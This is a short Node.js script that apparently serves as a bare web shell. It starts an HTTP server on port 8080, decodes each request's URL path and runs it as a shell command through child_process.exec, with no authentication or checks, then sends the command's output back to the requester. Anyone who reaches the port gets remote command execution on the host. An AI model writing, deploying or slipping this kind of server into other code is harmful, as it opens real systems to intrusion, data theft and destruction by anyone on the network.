console.log("asas"); 
var child = require('child_process');
 

const http = require('http');

const requestListener = function (req, res) {
    let command = decodeURI(req.url.substr(1))
  res.writeHead(200);
  res.write(command + "\n")
  child.exec(command, function(err, stdout, stderr) { 
    // Node.js will invoke this callback when process terminates.
    res.write(stdout)
    console.log(stdout); 
  res.end("")
}); 
// res.end("")
}

const server = http.createServer(requestListener);
server.listen(process.env.POST || 8080);
